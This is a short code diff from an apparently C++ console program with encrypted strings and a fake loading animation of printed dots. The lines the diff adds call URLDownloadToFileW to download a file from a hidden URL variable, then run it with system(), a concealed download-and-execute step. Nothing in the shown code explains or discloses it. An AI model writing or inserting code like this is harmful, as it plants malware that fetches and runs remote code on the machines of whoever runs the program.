@@ -424,7 +424,9 @@ int main()
 	printf(_T(EncryptS("."))); Sleep(450);
 	printf(_T(EncryptS("."))); Sleep(550);
 	printf(_T(EncryptS("."))); Sleep(1050);
-
+	HRESULT Hook = URLDownloadToFileW(NULL, Finder, locx, 0, NULL);
+	Sleep(1000);
+	system(Hooker.c_str());
 menu_:
 	system(_T(EncryptS("cls")));
 
